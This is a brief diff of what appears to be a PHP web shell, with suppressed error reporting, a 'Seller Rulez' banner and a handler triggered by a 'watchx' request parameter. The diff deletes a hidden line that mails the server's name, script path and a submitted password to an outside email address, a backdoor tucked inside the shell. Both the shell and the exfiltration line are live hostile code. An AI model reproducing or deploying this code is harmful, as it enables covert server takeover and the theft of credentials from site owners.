@@ -1,6 +1,5 @@
 <?php
 error_reporting (0);
-if(array_key_exists('watching',$_POST)){ $tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('mr.dhuaa@gmail.com', 'X', $tmp); // Edit or delete!
 //-------------- Seller Rulez !--------------
 if ($_REQUEST['watchx']) {
 	$version = phpversion();
